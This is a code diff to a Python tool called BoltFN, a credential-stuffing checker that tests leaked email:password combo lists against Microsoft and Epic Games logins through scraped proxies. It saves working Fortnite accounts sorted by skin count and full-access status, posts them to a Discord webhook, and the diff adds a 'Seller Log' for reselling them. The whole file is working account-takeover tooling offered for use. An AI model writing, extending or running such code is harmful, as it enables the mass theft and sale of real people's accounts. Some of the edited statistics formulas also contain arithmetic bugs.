@@ -3,7 +3,7 @@ import re
 import colorama
 import concurrent.futures
 from yaml import dump, full_load
-from deep_translator import GoogleTranslator
+import imaplib
 from tkinter import filedialog
 from urllib3 import disable_warnings
 import requests
@@ -87,6 +87,7 @@ class counter:
 
 
 class Counter:
+    sellerstuff = []
     brute = False
     Checking = False
     remaining = []
@@ -203,19 +204,17 @@ class Main:
         from time import time
         system('cls')
         windll.kernel32.SetConsoleTitleW(
-                f'BoltFN | v{self.version} | Select A mode')
+                f'BoltFN | v{self.version} | Select a mode')
         print(self.t)
         print(f'''
-{Fore.GREEN}|{Fore.WHITE}OPTIONS:
-
-{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Epicgames with Xbox Login {Fore.CYAN}| Full Capture
-{Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Epicgames with Xbox Login {Fore.CYAN}| Brute Mode
-{Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Scrape Proxies {Fore.CYAN}| Scrape proxies for checking
-{Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Edit Combos {Fore.CYAN}| Maximise your combos
-{Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Custom Url Scraper{Fore.CYAN} | Scrape proxies from a url file
-{Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Exit{Fore.CYAN} | Close the checker
+                                {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Full Capture using Microsoft authentication{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Brute Mode{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Proxy Scraper     {Fore.WHITE}[{Fore.CYAN}Scrape proxies for checking{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Combo Editor      {Fore.WHITE}[{Fore.CYAN}Maximise your combos{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Url Scraper       {Fore.WHITE}[{Fore.CYAN}Scrape proxies from a url file{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Exit
 ''')
-        mode = input(f'{Fore.YELLOW} > ')
+        mode = input(f'{Fore.YELLOW}                > ')
 
 
         if mode == "4":
@@ -239,11 +238,12 @@ class Main:
 [{Fore.GREEN}11{Fore.WHITE}] Duplicate Remover
 [{Fore.GREEN}12{Fore.WHITE}] Combo filter (remove bad lines)
 [{Fore.GREEN}13{Fore.WHITE}] Domain changer
-[{Fore.RED}14{Fore.WHITE}] BACK
+[{Fore.GREEN}14{Fore.WHITE}] Splitter
+[{Fore.RED}15{Fore.WHITE}] BACK
 ''')
             while True:
                 option = str(input(f'{Fore.YELLOW} > '))
-                if option in ("1", "2", "3", "4", "5", "6", "8", "9", "10", "11", "12", "13"):
+                if option in ("1", "2", "3", "4", "5", "6", "8", "9", "10", "11", "12", "13", "14"):
                     while True:
                         Result = ('Results')
                         if not path.exists(Result):
@@ -270,7 +270,7 @@ class Main:
                         except FileNotFoundError:
                             print("Folder not found.")
                             continue
-                elif option == "14":
+                elif option == "15":
                     system('cls')
                     Main()
                 else:
@@ -425,6 +425,7 @@ class Main:
                     break
                 elif 'log' == Checker.mode.lower():
                     self.cuimode = 'n'
+                    print(Fore.YELLOW)
                     print_slowly('Using Log Mode', 0.05)
                     break
                 else:
@@ -549,39 +550,40 @@ class Main:
         removed = withoutremoved - len(self.accounts)
         print(
         f'{Fore.GREEN}Imported {len(self.accounts)} Combo lines after removing {removed} duplicates\n')
-        print(f'{Fore.CYAN}Importing proxies.....\n')
         self.proxylist = []
         if Checker.Proxy.proxy == True:
+            print(f'{Fore.CYAN}Importing proxies.....\n')
             while True:
-                if not Checker.importFromFile:
-                    read_files = glob('proxies/*.txt')
-                    if read_files == '[]':
-                        print(
-                            f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
-                        input(f'{Fore.CYAN}Press ENTER when you have done that')
-                        continue
-                    for file in read_files:
-                        proxylistt = open(file, 'r', encoding='u8',
-                                        errors='ignore').read().split('\n')
-                        for line in proxylistt:
-                            self.proxylist.append(f'{line}')
-                    break
-                else:
-                    filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
-                    if filename is None:
-                        print(Fore.LIGHTRED_EX+"Invalid File.")
-                        sleep(1)
-                        continue
+                if not self.proxyapi:
+                    if not Checker.importFromFile:
+                        read_files = glob('proxies/*.txt')
+                        if read_files == '[]':
+                            print(
+                                f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
+                            input(f'{Fore.CYAN}Press ENTER when you have done that')
+                            continue
+                        for file in read_files:
+                            proxylistt = open(file, 'r', encoding='u8',
+                                            errors='ignore').read().split('\n')
+                            for line in proxylistt:
+                                self.proxylist.append(f'{line}')
+                        break
                     else:
-                        try:
-                            with open(filename.name, 'r', encoding='u8') as e:
-                                for line in e:
-                                    self.proxylist.append(f'{line}')
-                                break
-                        except:
-                            print(Fore.LIGHTRED_EX+"Unable to read from file")
+                        filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
+                        if filename is None:
+                            print(Fore.LIGHTRED_EX+"Invalid File.")
                             sleep(1)
                             continue
+                        else:
+                            try:
+                                with open(filename.name, 'r', encoding='u8') as e:
+                                    for line in e:
+                                        self.proxylist.append(f'{line}')
+                                    break
+                            except:
+                                print(Fore.LIGHTRED_EX+"Unable to read from file")
+                                sleep(1)
+                                continue
         if Checker.Proxy.proxy == True:
             if not self.proxyapi:
                 withoutremoved = len(self.proxylist)
@@ -627,16 +629,59 @@ class Main:
         except:
             self.proxylist = []
             print('\n')
+        Counter.Checking = True
         if 'y' == self.cuimode:
             Thread(target=self.Refreshconsole, daemon=False).start()
-        Counter.Checking = True
         Counter.remaining = list(self.accounts)
         with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
             futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
             concurrent.futures.wait(futures)
+        categorized_data = {
+            "Exclusives": [],
+            "300+ Skins": [],
+            "200-299 Skins": [],
+            "100-199 Skins": [],
+            "50-99 Skins": [],
+            "10-49 Skins": [],
+            "1-9 Skins": [],
+            "0 Skins": []
+        }
+
+        for entry in Counter.sellerstuff:
+            if entry["exclusive"] == "Yes":
+                categorized_data["Exclusives"].append(entry)
+            elif entry["total_skins"] >= 300:
+                categorized_data["300+ Skins"].append(entry)
+            elif 200 <= entry["total_skins"] <= 299:
+                categorized_data["200-299 Skins"].append(entry)
+            elif 100 <= entry["total_skins"] <= 199:
+                categorized_data["100-199 Skins"].append(entry)
+            elif 50 <= entry["total_skins"] <= 99:
+                categorized_data["50-99 Skins"].append(entry)
+            elif 10 <= entry["total_skins"] <= 49:
+                categorized_data["10-49 Skins"].append(entry)
+            elif 1 <= entry["total_skins"] <= 9:
+                categorized_data["1-9 Skins"].append(entry)
+            else:
+                categorized_data["0 Skins"].append(entry)
+
+        with open(f'{self.folder}/Seller Log.txt', 'w') as file:
+            for category, entries in categorized_data.items():
+                if entries:
+                    file.write(f"========== {category} =========\n")
+                    for entry in entries:
+                        file.write(f"FullAccess: {entry['fullAccess']} | VerifiedEmail: {entry['mail_verified']} | TwoFactor: {entry['2fa']} | Total Skins: {entry['total_skins']}\n")
+                        file.write(f"Skins: {', '.join(entry['skins_list'])}\n")
+                        if entry["exclusive"] == "Yes":
+                            file.write(f"Exclusives: {', '.join(entry['exclusives_list'])}\n")
+                        file.write("="*30 + "\n")
+        system('cls')
+        print(self.t)
+        print(f'{Fore.CYAN}Done checking')
+        print(f'Seller Log created, you may close the checker')
         Counter.Checking = False
                     
-                            
+
     def usecheck(self, line):
         try:
             if line.count(':') == 1:
@@ -647,6 +692,7 @@ class Main:
                             session = requests.sessions.session()
                             scraper = cloudscraper.create_scraper()
                             url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
+                                   
                             headers = {
                                     "Accept-Encoding": "gzip, deflate, br",
                                     "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
@@ -814,6 +860,8 @@ class Main:
                                                             os.makedirs(self.folder + '/Microsoft')
                                                         open(f'{self.folder}/Microsoft/Hits.txt', 'a',
                                                         encoding='u8').write(f'{line}\n')
+                                                        open(f'{self.folder}/Microsoft/All.txt', 'a',
+                                                        encoding='u8').write(f'{line}\n')
                                                         return
                                                     else:
                                                         retr+=1
@@ -893,6 +941,8 @@ class Main:
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/2fa.txt', 'a',
                                                     encoding='u8').write(f'{line}\n')
+                                                    open(f'{self.folder}/Microsoft/All.txt', 'a',
+                                                    encoding='u8').write(f'{line}\n')
                                                     return
                                                 elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
                                                     Counter.hits+=1
@@ -918,6 +968,8 @@ class Main:
                                                     if not os.path.exists(self.folder + '/Microsoft'):
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/Xbox.txt', 'a',
+                                                    encoding='u8').write(f'{line}\n')
+                                                    open(f'{self.folder}/Microsoft/All.txt', 'a',
                                                     encoding='u8').write(f'{line}\n')
                                                     return                                      
                                                 elif 'code is required' in response.text:
@@ -1002,12 +1054,14 @@ class Main:
                                                         Counter.mshit+=1
                                                         if line in Counter.remaining:
                                                             Counter.remaining.remove(line)
-                                                        Counter.epic2fa+=1
-                                                        if 'n' == self.cuimode:
-                                                            self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
+                                                        if Checker.printms:
+                                                            if 'n' == self.cuimode:
+                                                                self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {line}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
-                                                        open(f'{self.folder}/Microsoft/2fa2.txt', 'a',
+                                                        open(f'{self.folder}/Microsoft/XboxBan.txt', 'a',
+                                                        encoding='u8').write(f'{line}\n')
+                                                        open(f'{self.folder}/Microsoft/All.txt', 'a',
                                                         encoding='u8').write(f'{line}\n')
                                                         return
                                                     else:
@@ -1108,12 +1162,14 @@ class Main:
                                                             Counter.mshit+=1
                                                             if line in Counter.remaining:
                                                                 Counter.remaining.remove(line)
-                                                            Counter.epic2fa
-                                                            if 'n' == self.cuimode:
-                                                                self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
+                                                            if Checker.printms:
+                                                                if 'n' == self.cuimode:
+                                                                    self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {line}')
                                                             if not os.path.exists(self.folder + '/Microsoft'):
                                                                 os.makedirs(self.folder + '/Microsoft')
-                                                            open(f'{self.folder}/Microsoft/2fa.txt', 'a',
+                                                            open(f'{self.folder}/Microsoft/XboxBan.txt', 'a',
+                                                            encoding='u8').write(f'{line}\n')
+                                                            open(f'{self.folder}/Microsoft/All.txt', 'a',
                                                             encoding='u8').write(f'{line}\n')
                                                             return
                                                     sid = response.json()
@@ -1401,7 +1457,6 @@ class Main:
                                                     continue  
                                             try:
                                                 if "tutorial" in str(data):
-                                                    Counter.stw+=1
                                                     has_stw = "YES"
                                                 else:
                                                     has_stw = "NO"
@@ -1422,20 +1477,24 @@ class Main:
                                                     Counter.retries+=1
                                                     continue  
                                             if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
-                                                Counter.mshit +=1
                                                 if line in Counter.remaining:
                                                             Counter.remaining.remove(line)
                                                 Counter.fnban+=1
                                                 if 'n' == self.cuimode:
                                                     self.prints(f'{Fore.YELLOW}[FN-BAN] - {line}')
-                                                if not os.path.exists(self.folder + '/Microsoft'):
-                                                    os.makedirs(self.folder + '/Microsoft')
-                                                open(f'{self.folder}/Microsoft/Banned.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite'):
+                                                    os.makedirs(self.folder + '/Fortnite')
+                                                open(f'{self.folder}/Fortnite/Banned.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                                 return
                                             Counter.hits+=1
-                                            if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                            if has_stw == 'YES':
+                                                Counter.stw+=1
+                                            try:
+                                                if line in Counter.remaining:
+                                                    Counter.remaining.remove(line)
+                                            except:
+                                                n = 'n'
                                             level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                                             total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                                             level_match = level_pattern.search(response_str)
@@ -1451,6 +1510,7 @@ class Main:
                                                         if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                                             first_active_season = season
                                                 except:
+                                                    n = 'n'
                                                     continue
                                             if first_active_season:
                                                 first_active_season = first_active_season['seasonNumber']
@@ -1503,8 +1563,8 @@ class Main:
                                             processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                                             exclusiveSkins = [
                                                 'black knight','chun-li', 'huntmaster saber', 'the reaper', 'blue squire', 
-                                                'royale knight', 'sparkle specialist', 'gold brutus', 'omega', 
-                                                'gold midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
+                                                'royale knight', 'sparkle specialist', 'brutus', 
+                                                'midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
                                                 'strong guard', 'rose team leader', 'warpaint', 'travis', 
                                                 'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik'
                                             ]
@@ -1581,42 +1641,40 @@ class Main:
                                                 f' - {line}'
                                                 )
                                             try:
-                                                if int(first_active_season.strip()) <= 4:
+                                                if int(first_active_season) <= 4:
                                                     Counter.og +=1
                                             except:
                                                 pass
                                             fullAccess = 'NFA'
-                                            if epicEmail == email:
+                                            outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]
+                                            if epicEmail.lower() == email.lower() and any(domain in email.lower() for domain in outlook_domains):
                                                 fullAccess = 'FA'
                                             Counter.skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins, "exclusive": exclusive})
                                             if not os.path.exists(self.folder + '/Fortnite'):
                                                 os.makedirs(self.folder + '/Fortnite')
                                             open(f'{self.folder}/Fortnite/all.txt', 'a',
                                             encoding='u8').write(f'{line}\n')
-                                            message = f"Email: {email}\nPassword: {password}\nName: {display_name}\nType: {fullAccess}"
-                                            if tfa_enabled != None: message+=f"\n2FA: {tfa_enabled}"
-                                            if fullAccess == 'NFA': message+=f"\nEpic Email: {epicEmail}"
-                                            if country != None: message+=f"\nCountry: {country}"
-                                            if has_stw != 'NO': message+=f"\nSave The World"
-                                            if level != None: message+=f"\nLevel: {level}"
-                                            if Total_VBucks != None: message+=f"\nVbucks: {Total_VBucks}"
-                                            if total_wins != None: message+=f"\nTotal Wins: {total_wins}"
-                                            if first_active_season != None: message+=f"\nFirst Season: {first_active_season}"                                        
-                                            if total_dances != None: message+=f"\nEmotes: {total_dances}"
-                                            if total_gliders != None: message+=f"\nGliders: {total_gliders}"
-                                            if total_pickaxes != None: message+=f"\nPickaxes: {total_pickaxes}"
-                                            if total_backpacks != None: message+=f"\nBackBlings: {total_backpacks}"
-                                            if total_skins != None: message+=f"\nSkins: {total_skins}"
-                                            if exclusive: message+=f"\nExclusive Skins List: {exclusiveSkin}"
-                                            if processed_skins != None: message+=f"\nSkins List: {processed_skins}"
-                                            message = message+"\n============================\n"
+                                            message = f"{email}:{password} | Name: {display_name} | FullAccess: {fullAccess} | Email Verified: {email_verified_status}"
+                                            if tfa_enabled != None: message+=f" | 2FA: {tfa_enabled}"
+                                            if fullAccess == 'NFA': message+=f" | Epic Email: {epicEmail}"
+                                            if country != None: message+=f" | Country: {country}"
+                                            if has_stw != 'NO': message+=f" | Save The World"
+                                            if level != None: message+=f" | Level: {level}"
+                                            if Total_VBucks != None: message+=f"  | Vbucks: {Total_VBucks}"
+                                            if total_wins != None: message+=f" | Total Wins: {total_wins}"
+                                            if first_active_season != None: message+=f" | First Season: {first_active_season}"                                        
+                                            if total_dances != None: message+=f" | Emotes: {total_dances}"
+                                            if total_gliders != None: message+=f" | Gliders: {total_gliders}"
+                                            if total_pickaxes != None: message+=f" | Pickaxes: {total_pickaxes}"
+                                            if total_backpacks != None: message+=f" | BackBlings: {total_backpacks}"
+                                            if exclusive: message+=f"\nExclusives: [{len(exclusiveSkin)}] {exclusiveSkin}"
+                                            if processed_skins != None: message+=f"\nSkins: [{total_skins}] {processed_skins}"
+                                            message = message+"\n============================"
                                             if not exclusive:
                                                 exclusiveskins = 0
-                                                exclusiveSkin = ''
                                             else:
                                                 exclusiveskins = len(exclusiveSkin)
-                                            if not total_skins > 0:
-                                                processed_skins = 0
+                                            Counter.sellerstuff.append({"fullAccess": fullAccess,"2fa": tfa_enabled, "total_skins": total_skins,"skins_list": processed_skins,"exclusive": exclusive,"exclusives_list": exclusiveSkin,"mail_verified": email_verified_status})
                                             if Checker.webhook.webhooky:
                                                 payload = {
                                                         "username": "BOLTFN",
@@ -1646,57 +1704,57 @@ class Main:
                                                         ]
                                                 }
                                                 r = requests.post(Checker.webhook.webhookid, json=payload)
-                                            if exclusive == True:
+                                            if exclusive:
                                                 if not os.path.exists(self.folder + '/Fortnite/Exclusive'):
                                                     os.makedirs(self.folder + '/Fortnite/Exclusive')
-                                                open(f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
-                                            elif int(total_skins) == 0:
+                                            if int(total_skins) == 0:
                                                 if not os.path.exists(self.folder + '/Fortnite/NoSkins'):
                                                     os.makedirs(self.folder + '/Fortnite/NoSkins')
-                                                open(f'{self.folder}/Fortnite/NoSkins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/NoSkins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/NoSkins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 1 and int(total_skins) < 10:
                                                 if not os.path.exists(self.folder + '/Fortnite/1-9Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/1-9Skins')
-                                                open(f'{self.folder}/Fortnite/1-9Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/1-9Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/1-9Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 10 and int(total_skins) < 50:
                                                 if not os.path.exists(self.folder + '/Fortnite/10-49Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/10-49Skins')
-                                                open(f'{self.folder}/Fortnite/10-49Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/10-49Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/10-49Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 50 and int(total_skins) < 100:
                                                 if not os.path.exists(self.folder + '/Fortnite/50-99Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/50-99Skins')
-                                                open(f'{self.folder}/Fortnite/50-99Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/50-99Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/50-99Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 100 and int(total_skins) < 200:
                                                 if not os.path.exists(self.folder + '/Fortnite/100-199Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/100-199Skins')
-                                                open(f'{self.folder}/Fortnite/100-199Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/100-199Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/100-199Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 200 and int(total_skins) < 300:
                                                 if not os.path.exists(self.folder + '/Fortnite/200-299Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/200-299Skins')
-                                                open(f'{self.folder}/Fortnite/200-299Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/200-299Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/200-299Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 300:
                                                 if not os.path.exists(self.folder + '/Fortnite/300+Skins'):
                                                     os.makedirs(self.folder + '/Fortnite/300+Skins')
-                                                open(f'{self.folder}/Fortnite/300+Skins/{str(total_skins)} Skins.txt', 'a',
+                                                open(f'{self.folder}/Fortnite/300+Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                                 open(f'{self.folder}/Fortnite/300+Skins/All.txt', 'a',
                                                 encoding='u8').write(f'{line}\n')
@@ -1918,15 +1976,15 @@ class Main:
     def title(self):
         while True:
                 Total = len(self.accounts)
-                Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked
+                Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
                 badd = Counter.bad / Total * 100
-                chek = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked
+                chek = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
                 estimated = 0
                 if Checked > 0:
-                    estimated = Counter.hits/Checked * Total
+                    estimated = Counter.hits + Counter.fnban/Checked * Total
                 Counter.checkedpercent = round((chek / Total) * 100, 2)
                 Counter.failedpercent = round(badd, 2)
-                Counter.hitspercent = round((int(Counter.hits) / Total) * 100, 2)
+                Counter.hitspercent = round((Counter.hits + Counter.fnban / Total) * 100, 2)
                 Counter.headlesspercent = round((int(Counter.headless) / Total) * 100, 2)
                 cust = Counter.custom + Counter.locked
                 Counter.custompercent =round(number=(cust / Total * 100), ndigits=2)
@@ -1936,8 +1994,8 @@ class Main:
                 if not Counter.brute:
                     windll.kernel32.SetConsoleTitleW(
                         f"BoltFN | v{self.version}"
-                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
-                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
+                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban}/{Total} ({Counter.checkedpercent}%)"
+                        f" | Hits: {Counter.hits + Counter.fnban} ({Counter.hitspercent}%) [{estimatedhits}]"
                         f" | Headless: {Counter.headless} ({Counter.headlesspercent}%)"
                         f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
                         f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
@@ -1978,18 +2036,20 @@ class Main:
 
 
     def cpm_counter(self):
+        sleep(5)
         while True:
-            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked
-            sleep(0.5)
-            awa = (Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked)-checked
-            Counter.cpm = awa * 60
+            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
+            timee = time.time() - self.start_time
+            awa = checked / timee
+            cpm = awa * 60
+            Counter.cpm = int(cpm)
 
     def prints(self, line):
         lock.acquire()
         print(f'{line}')
         lock.release()
     def Refreshconsole(self):
-        while True:
+        while Counter.Checking:
             try:
                 time.sleep(1)
                 if self.cuitype == 'cn':
@@ -2062,7 +2122,7 @@ class Main:
                     print(f" {Fore.WHITE}└── [{Counter.custom}] {Fore.YELLOW}2FA")
                     print(f"{Fore.WHITE}[{Counter.mshit}] {Fore.GREEN}MS-Hit")
                     print(f" {Fore.WHITE}├── [{Counter.headless}] {Fore.GREEN}Headless")
-                    print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.fnban - Counter.epic2fa - Counter.xb - Counter.headless}] {Fore.YELLOW}Not linked")
+                    print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.epic2fa - Counter.xb - Counter.headless}] {Fore.YELLOW}Not linked")
                     print(f" {Fore.WHITE}├── [{Counter.epic2fa}] {Fore.YELLOW}2FA")
                     print(f" {Fore.WHITE}├── [{Counter.xb}] {Fore.YELLOW}Xbox")
                     print(f" {Fore.WHITE}└── [{Counter.fnban}] {Fore.YELLOW}Banned")
@@ -2121,21 +2181,22 @@ class Main:
                             nfa +=1
                         if exclusive:
                             exclusivee+=1
-                        elif 300 <= total_skins:
-                            threehundredplus+=1
-                        elif 200 <= total_skins <= 299:
-                            twohundredplus+=1
-                        elif 100 <= total_skins <= 199:
-                            onehundredplus+=1
-                        elif 50 <= total_skins <= 99:
-                            fiftyplus+=1
-                        elif 10 <= total_skins <= 49:
-                            tenplus+=1
-                        elif 1 <= total_skins <= 9:
-                            oneplus+=1
+                        if total_skins >= 300:
+                            threehundredplus += 1
+                        elif total_skins >= 200:
+                            twohundredplus += 1
+                        elif total_skins >= 100:
+                            onehundredplus += 1
+                        elif total_skins >= 50:
+                            fiftyplus += 1
+                        elif total_skins >= 10:
+                            tenplus += 1
+                        elif total_skins >= 1:
+                            oneplus += 1
                         elif total_skins == 0:
-                            zeroskins +=1
+                            zeroskins += 1
                     symbo4 = f'{Fore.WHITE}[{Fore.GREEN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbop = f'{Fore.WHITE}[{Fore.LIGHTMAGENTA_EX}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     symbol = f'{Fore.WHITE}[{Fore.CYAN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     symbo1 = f'{Fore.WHITE}[{Fore.BLUE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     symbo2 = f'{Fore.WHITE}[{Fore.WHITE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
@@ -2145,17 +2206,19 @@ class Main:
                     symbo5 = f'{Fore.WHITE}[{Fore.LIGHTGREEN_EX}+{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     symbo6 = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}-{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     symbo7 = f'{Fore.WHITE}[{Fore.LIGHTYELLOW_EX}/{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo8 = f'{Fore.WHITE}[{Fore.LIGHTBLACK_EX}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
                     bad = Counter.bad + Counter.mshit + Counter.custom + Counter.locked
                     if not Counter.brute:
                         result = (
                             f'                           {Fore.MAGENTA}  ------CHECKER-------     -------STATS-------      ------SKINS------\n'
-                            f'                              {symbo5} Hits      {Counter.hits:<8}  {symbo4} NFA         {nfa:<8}  {symbo4} 300+     {threehundredplus:<8}\n'
-                            f'                              {symbo6} Fails     {bad:<8}  {symbol} FA          {maybefa:<8}  {symbo4} 200+     {twohundredplus:<8}\n'
-                            f'                              {symbo7} CPM       {Counter.cpm:<8}  {symbo2} STW         {Counter.stw:<8}  {symbo4} 100+     {onehundredplus:<8}\n'
-                            f'                             {Fore.MAGENTA}--------------------     {symbo3} Rares       {exclusivee:<8}  {symbo4} 50+      {fiftyplus:<8}\n'
-                            f'                                                      {symb4o} Ogs         {Counter.og:<8}  {symbo4} 10+      {tenplus:<8}\n'
-                            f'                                                      {symbo1} Headless    {Counter.headless:<8}  {symbo4} 0        {zeroskins:<8}\n'
-                            f'                                                      {symb5o} Epic 2FA    {Counter.epic2fa:<8} {Fore.MAGENTA}-----------------\n'
+                            f'                              {symbo5} Hits      {Counter.hits + Counter.fnban:<8}  {symbo4} NFA         {nfa:<8}  {symbop} 300+     {threehundredplus:<8}\n'
+                            f'                              {symbo6} Fails     {bad:<8}  {symbol} FA          {maybefa:<8}  {symbop} 200+     {twohundredplus:<8}\n'
+                            f'                              {symbo7} CPM       {Counter.cpm:<8}  {symbo2} STW         {Counter.stw:<8}  {symbop} 100+     {onehundredplus:<8}\n'
+                            f'                             {Fore.MAGENTA}--------------------     {symbo3} Rares       {exclusivee:<8}  {symbop} 50+      {fiftyplus:<8}\n'
+                            f'                                                      {symb4o} Ogs         {Counter.og:<8}  {symbop} 10+      {tenplus:<8}\n'
+                            f'                                                      {symbo1} Headless    {Counter.headless:<8}  {symbop} 1+       {oneplus:<8}\n'
+                            f'                                                      {symb5o} Epic 2FA    {Counter.epic2fa:<8}  {symbop} 0        {zeroskins:<8}\n'
+                            f'                                                      {symbo8} Banned      {Counter.fnban:<8} {Fore.MAGENTA}-----------------\n'
